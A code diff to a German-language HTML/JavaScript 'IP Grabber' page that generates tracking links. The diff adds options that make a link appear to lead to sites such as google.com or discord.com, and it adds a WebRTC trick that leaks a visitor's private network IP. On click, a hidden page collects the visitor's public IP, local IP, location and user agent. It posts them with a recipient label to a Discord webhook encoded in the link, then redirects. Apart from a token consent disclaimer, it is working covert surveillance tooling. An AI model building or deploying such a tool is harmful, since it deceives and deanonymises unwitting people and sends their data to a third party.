@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Grabber · Final mit Empfängerkennung</title>
+    <title>IP Grabber · Öffentlich + Geräte-IP</title>
     <style>
         body { visibility: hidden; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
         body.admin-mode { visibility: visible; background: #f1f5f9; min-height: 100vh; padding: 20px; color: #0f172a; }
@@ -15,20 +15,22 @@
         .tab.active { color: #2563eb; border-bottom: 3px solid #2563eb; background: white; }
         .tab-content { display: none; } .tab-content.active { display: block; }
         .form-group { margin-bottom: 24px; } label { display: block; margin-bottom: 8px; font-weight: 600; }
-        input, textarea { width: 100%; padding: 14px 18px; border: 1.5px solid #cbd5e1; border-radius: 20px; font-size: 1rem; }
+        input, select, textarea { width: 100%; padding: 14px 18px; border: 1.5px solid #cbd5e1; border-radius: 20px; font-size: 1rem; background: white; }
         button { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-weight: 600; cursor: pointer; }
         button.copy-btn { background: #10b981; } button.secondary { background: #e2e8f0; color: #1e293b; }
         .url-display { background: #f8fafc; padding: 16px; border-radius: 24px; font-family: monospace; word-break: break-all; border: 1.5px solid #cbd5e1; }
         .stats { margin-top: 20px; padding: 16px; background: #f1f5f9; border-radius: 18px; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; } th { background: #eef2ff; padding: 12px; } td { padding: 12px; border-bottom: 1px solid #e2e8f0; }
-        .flex-row { display: flex; gap: 12px; align-items: center; }
+        .flex-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+        .note { background: #f8fafc; padding: 8px 12px; border-radius: 12px; font-size: 0.85rem; color: #475569; margin-top: 6px; }
+        .mask-note { background: #e6f7ff; border-left: 4px solid #0284c7; padding: 12px 16px; border-radius: 12px; margin: 16px 0; }
     </style>
 </head>
 <body>
     <div id="adminPanel" style="display:none;">
         <div class="container">
-            <h1>IP‑Logger · Mit Empfängerkennung</h1>
-            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt in Discord an, für wen der Link bestimmt war.</div>
+            <h1>IP‑Logger · Öffentliche + Geräte‑IP</h1>
+            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt öffentliche Internet‑IP und (optional) lokale Geräte‑IP.</div>
             <div class="tabs">
                 <div class="tab active" data-tab="generator">🔗 Link Generator</div>
                 <div class="tab" data-tab="logs">📋 Lokale Logs</div>
@@ -41,17 +43,47 @@
                 <div class="form-group"><label>🌍 Server‑Basis‑URL</label><input type="url" id="baseUrlInput" placeholder="Leer = aktuelle Adresse"></div>
                 <div class="form-group"><label>💬 Eigene Nachricht</label><input type="text" id="customMsg" placeholder="Neuer Klick"></div>
                 <div class="form-group"><label>👤 Kennzeichnung (z.B. Name des Empfängers)</label><input type="text" id="labelInput" placeholder="Max / Testperson 1"></div>
+                
+                <!-- Tarn‑Domain Auswahl -->
+                <div class="form-group">
+                    <label>🎭 Tarn‑Domain (wie soll der Link aussehen?)</label>
+                    <select id="maskPreset">
+                        <option value="">Keine Tarnung (echte URL anzeigen)</option>
+                        <option value="https://google.com">google.com</option>
+                        <option value="https://youtube.com">youtube.com</option>
+                        <option value="https://facebook.com">facebook.com</option>
+                        <option value="https://twitter.com">twitter.com</option>
+                        <option value="https://instagram.com">instagram.com</option>
+                        <option value="https://tiktok.com">tiktok.com</option>
+                        <option value="https://discord.com">discord.com</option>
+                        <option value="custom">✨ Eigene Domain angeben</option>
+                    </select>
+                    <div id="customMaskContainer" style="display:none; margin-top:12px;">
+                        <input type="text" id="customMaskUrl" placeholder="https://deinedomain.de/pfad">
+                    </div>
+                    <div id="maskPathContainer" style="margin-top:12px;">
+                        <input type="text" id="maskPath" placeholder="optionaler Pfad (z.B. /gewinnspiel)">
+                    </div>
+                </div>
+                
                 <button id="generateBtn">✨ Link generieren</button>
                 <div id="resultPanel" style="display:none; margin-top:28px;">
-                    <h3>🔽 Dein Link</h3><div class="url-display" id="generatedUrl"></div>
-                    <div class="flex-row" style="margin-top:16px;"><button class="copy-btn" id="copyBtn">📋 Kopieren</button><button class="secondary" id="testOwnBtn">🧪 Selbst testen</button></div>
+                    <h3>🔽 Dein Link</h3>
+                    <div><strong>🔗 Echte URL:</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
+                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL:</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
+                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL.</div>
+                    <div class="flex-row" style="margin-top:16px;">
+                        <button class="copy-btn" id="copyMaskedBtn">📋 Tarn‑Link kopieren</button>
+                        <button class="secondary" id="copyRealBtn">📋 Echten Link kopieren</button>
+                        <button class="secondary" id="testOwnBtn">🧪 Selbst testen</button>
+                    </div>
                     <div class="stats"><p>👁️ Klicks: <strong id="clickCount">0</strong> | Letzter: <span id="lastAccess">—</span></p><p>🔍 ID: <span id="linkIdDisplay"></span></p></div>
                 </div>
             </div>
             <!-- Logs -->
             <div id="logs" class="tab-content">
                 <h3>📜 Lokale Logs</h3><button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
-                <table><thead><tr><th>IP</th><th>Zeit</th><th>User‑Agent</th><th>Link</th></tr></thead><tbody id="logsBody"></tbody></table>
+                <table><thead><tr><th>Öffentliche IP</th><th>Geräte‑IP (lokal)</th><th>Zeit</th><th>User‑Agent</th><th>Link</th></tr></thead><tbody id="logsBody"></tbody></table>
             </div>
             <!-- Einstellungen -->
             <div id="settings" class="tab-content">
@@ -59,6 +91,7 @@
                 <div class="form-group"><label>⏱️ Verzögerung (ms)</label><input type="number" id="delayInput" value="3000"></div>
                 <div class="form-group"><label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label></div>
                 <div class="form-group"><label><input type="checkbox" id="collectLocationCb"> Standort ermitteln (ipapi.co)</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP (lokal) via WebRTC ermitteln</label><div class="note">⚠️ Funktioniert nur unter HTTPS. Zeigt die private IP im Heimnetzwerk an.</div></div>
                 <div class="form-group"><label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label></div>
                 <div class="form-group"><label>Standard‑Basis‑URL</label><input type="url" id="defaultBaseUrl"></div>
                 <button id="saveSettingsBtn">💾 Speichern</button>
@@ -69,7 +102,7 @@
         (function(){
             "use strict";
             // ---------- STATE ----------
-            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,storeLocal:true,defaultBase:''},currentLinkId=null;
+            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,collectLocalIP:false,storeLocal:true,defaultBase:''},currentLinkId=null;
 
             // ---------- UTILS ----------
             function generateId(){return Date.now()+'-'+Math.random().toString(36).substr(2,8);}
@@ -88,6 +121,7 @@
                     document.getElementById('delayInput').value=settings.delay;
                     document.getElementById('collectUACb').checked=settings.collectUA;
                     document.getElementById('collectLocationCb').checked=settings.collectLocation;
+                    document.getElementById('collectLocalIPCb').checked=settings.collectLocalIP;
                     document.getElementById('storeLocalCb').checked=settings.storeLocal;
                     document.getElementById('defaultBaseUrl').value=settings.defaultBase||'';
                 }
@@ -99,21 +133,47 @@
                 settings.delay=parseInt(document.getElementById('delayInput').value,10)||3000;
                 settings.collectUA=document.getElementById('collectUACb').checked;
                 settings.collectLocation=document.getElementById('collectLocationCb').checked;
+                settings.collectLocalIP=document.getElementById('collectLocalIPCb').checked;
                 settings.storeLocal=document.getElementById('storeLocalCb').checked;
                 settings.defaultBase=document.getElementById('defaultBaseUrl').value.trim();
                 localStorage.setItem('ipg_settings',JSON.stringify(settings));
             }
 
-            // ---------- IP & LOCATION ----------
-            async function fetchIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
+            // ---------- IP-ERMITTLUNG ----------
+            async function fetchPublicIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
+            async function fetchLocalIP(){
+                if(!settings.collectLocalIP)return null;
+                return new Promise((resolve)=>{
+                    try{
+                        const pc=new RTCPeerConnection({iceServers:[]});
+                        pc.createDataChannel('');
+                        pc.createOffer().then(offer=>pc.setLocalDescription(offer)).catch(()=>{});
+                        pc.onicecandidate=(ice)=>{
+                            if(!ice||!ice.candidate||!ice.candidate.candidate)return;
+                            const candidate=ice.candidate.candidate;
+                            const ipRegex=/([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                            const match=candidate.match(ipRegex);
+                            if(match){
+                                const ip=match[1];
+                                if(!ip.startsWith('127.')&&!ip.startsWith('::1')){
+                                    pc.close();
+                                    resolve(ip);
+                                }
+                            }
+                        };
+                        setTimeout(()=>{pc.close();resolve(null);},3000);
+                    }catch(e){resolve(null);}
+                });
+            }
             async function fetchLocation(ip){if(!settings.collectLocation)return null;try{const r=await fetch(`https://ipapi.co/${ip}/json/`);const d=await r.json();if(d.error)return null;return `${d.city||'Unbekannt'}, ${d.country_name||''}`.trim();}catch(e){return null;}}
 
-            // ---------- DISCORD SENDEN ----------
-            async function sendDiscord(webhookUrl, ip, ua, location, linkId, customMsg, label){
+            // ---------- DISCORD SENDEN (mit Geräte-IP) ----------
+            async function sendDiscord(webhookUrl, publicIP, localIP, ua, location, linkId, customMsg, label){
                 if(!webhookUrl||!webhookUrl.includes('discord.com/api/webhooks'))return false;
                 const locationText=location?`\n📍 Standort: ${location}`:'';
+                const localIPText=localIP?`\n🏠 Geräte‑IP (lokal): \`${localIP}\``:'';
                 const labelText=label?`\n👤 Gekennzeichnet als: **${label}**`:'';
-                const description=`${customMsg||'Neuer Klick'}\n\n🌐 IP: \`${ip}\`${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
+                const description=`${customMsg||'Neuer Klick'}\n\n🌐 Öffentliche IP: \`${publicIP}\`${localIPText}${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
                 const embed={title:"🌍 IP‑Logger",description,color:0x3b82f6,timestamp:new Date().toISOString(),footer:{text:`Link‑ID: ${linkId}`}};
                 try{
                     const resp=await fetch(webhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})});
@@ -132,17 +192,18 @@
                     if(encodedMsg)customMsg=base64Decode(encodedMsg);
                     if(encodedLabel)label=base64Decode(encodedLabel);
                 }catch(e){document.body.innerHTML='<h2>Fehler: Ungültiger Link</h2>';document.body.style.visibility='visible';return true;}
-                const ip=await fetchIP();
+                const publicIP=await fetchPublicIP();
+                const localIP=settings.collectLocalIP?await fetchLocalIP():null;
                 const ua=settings.collectUA?navigator.userAgent:null;
-                const location=settings.collectLocation?await fetchLocation(ip):null;
-                sendDiscord(webhookUrl,ip,ua,location,linkId,customMsg,label);
+                const location=settings.collectLocation?await fetchLocation(publicIP):null;
+                sendDiscord(webhookUrl,publicIP,localIP,ua,location,linkId,customMsg,label);
                 if(settings.storeLocal){
-                    const logEntry={id:generateId(),ip,ua,location,label,linkId,timestamp:new Date().toISOString()};
+                    const logEntry={id:generateId(),publicIP,localIP,ua,location,label,linkId,timestamp:new Date().toISOString()};
                     ipLogs.push(logEntry);saveLogs();
                     const link=links.find(l=>l.id===linkId);
                     if(link){link.clicks++;link.lastAccess=new Date().toISOString();saveLinks();}
                 }
-                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>IP: ${ip}<br>Standort: ${location||'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
+                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>Öffentliche IP: ${publicIP}<br>Geräte‑IP: ${localIP||'aus'}<br>Standort: ${location||'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
                 document.body.style.visibility='visible';
                 setTimeout(()=>{window.location.href=target;},settings.delay);
                 return true;
@@ -155,15 +216,21 @@
                 document.body.style.visibility='visible';
                 initAdminUI();
                 renderLogs();
+                const presetSelect=document.getElementById('maskPreset');
+                const customContainer=document.getElementById('customMaskContainer');
+                presetSelect.addEventListener('change',()=>{
+                    customContainer.style.display=presetSelect.value==='custom'?'block':'none';
+                });
             }
             function renderLogs(){
                 const tbody=document.getElementById('logsBody');
                 if(!tbody)return;
-                if(!ipLogs.length){tbody.innerHTML='<tr><td colspan="4">Keine Logs</td></tr>';return;}
-                tbody.innerHTML=[...ipLogs].reverse().map(l=>`<tr><td>${l.ip}${l.location?'<br><small>'+l.location+'</small>':''}${l.label?'<br>🏷️ '+l.label:''}</td><td>${formatDate(l.timestamp)}</td><td>${l.ua?.substring(0,30)||'-'}</td><td>${l.linkId.slice(-6)}</td></tr>`).join('');
+                if(!ipLogs.length){tbody.innerHTML='<tr><td colspan="5">Keine Logs</td></tr>';return;}
+                tbody.innerHTML=[...ipLogs].reverse().map(l=>`<tr><td>${l.publicIP||l.ip||'-'}</td><td>${l.localIP||'-'}</td><td>${formatDate(l.timestamp)}</td><td>${l.ua?.substring(0,30)||'-'}</td><td>${l.linkId.slice(-6)}</td></tr>`).join('');
             }
             function initAdminUI(){
                 document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab,.tab-content').forEach(el=>el.classList.remove('active'));t.classList.add('active');document.getElementById(t.dataset.tab).classList.add('active');})});
+                
                 document.getElementById('generateBtn').addEventListener('click',()=>{
                     const target=document.getElementById('targetUrl').value.trim();
                     const webhook=document.getElementById('webhookInput').value.trim();
@@ -176,29 +243,52 @@
                     if(!base)base=settings.defaultBase;
                     if(!base)base=window.location.origin+window.location.pathname;
                     if(!base.endsWith('/')&&!base.includes('?'))base+='/';
+                    
+                    let maskedUrl='';
+                    const preset=document.getElementById('maskPreset').value;
+                    const path=document.getElementById('maskPath').value.trim();
+                    if(preset==='custom'){
+                        maskedUrl=document.getElementById('customMaskUrl').value.trim();
+                    }else if(preset){
+                        maskedUrl=preset+(path?path:'');
+                    }
+                    
                     const encodedWh=base64Encode(webhook);
                     const params=new URLSearchParams();
                     params.set('id',linkId);params.set('to',target);params.set('wh',encodedWh);
                     if(customMsg)params.set('msg',base64Encode(customMsg));
                     if(label)params.set('lbl',base64Encode(label));
-                    const finalUrl=base+(base.includes('?')?'&':'?')+params.toString();
-                    const newLink={id:linkId,target,webhook,customMsg,label,clicks:0,lastAccess:null};
+                    const realUrl=base+(base.includes('?')?'&':'?')+params.toString();
+                    
+                    const newLink={id:linkId,target,webhook,customMsg,label,maskedUrl:maskedUrl||null,clicks:0,lastAccess:null};
                     links.push(newLink);saveLinks();
+                    
                     document.getElementById('resultPanel').style.display='block';
-                    document.getElementById('generatedUrl').textContent=finalUrl;
+                    document.getElementById('realUrlDisplay').textContent=realUrl;
+                    document.getElementById('maskedUrlDisplay').textContent=maskedUrl||realUrl;
                     document.getElementById('linkIdDisplay').textContent=linkId;
                     currentLinkId=linkId;
                     document.getElementById('clickCount').textContent='0';
                     document.getElementById('lastAccess').textContent='—';
                 });
-                document.getElementById('copyBtn').addEventListener('click',()=>navigator.clipboard?.writeText(document.getElementById('generatedUrl').textContent).then(()=>alert('Kopiert!')));
-                document.getElementById('testOwnBtn').addEventListener('click',()=>{if(!currentLinkId)return alert('Kein Link generiert.');window.open(document.getElementById('generatedUrl').textContent+'&debug=1','_blank');});
+                
+                document.getElementById('copyMaskedBtn').addEventListener('click',()=>{
+                    navigator.clipboard?.writeText(document.getElementById('maskedUrlDisplay').textContent).then(()=>alert('Tarn‑Link kopiert!'));
+                });
+                document.getElementById('copyRealBtn').addEventListener('click',()=>{
+                    navigator.clipboard?.writeText(document.getElementById('realUrlDisplay').textContent).then(()=>alert('Echter Link kopiert!'));
+                });
+                document.getElementById('testOwnBtn').addEventListener('click',()=>{
+                    if(!currentLinkId)return alert('Kein Link generiert.');
+                    window.open(document.getElementById('realUrlDisplay').textContent+'&debug=1','_blank');
+                });
                 document.getElementById('testWebhookBtn').addEventListener('click',async()=>{
                     const wh=document.getElementById('webhookInput').value.trim();
                     if(!wh)return alert('Webhook eingeben');
-                    const ok=await sendDiscord(wh,'Test-IP','Test-UA','Test-Standort','test','Testnachricht','TestLabel');
+                    const ok=await sendDiscord(wh,'Test-Public','Test-Local','Test-UA','Test-Standort','test','Testnachricht','TestLabel');
                     document.getElementById('testResult').textContent=ok?'✅ Erfolg':'❌ Fehler';
                 });
+                
                 document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[];saveLogs();renderLogs();});
                 document.getElementById('saveSettingsBtn').addEventListener('click',()=>{saveSettings();alert('Gespeichert');});
             }
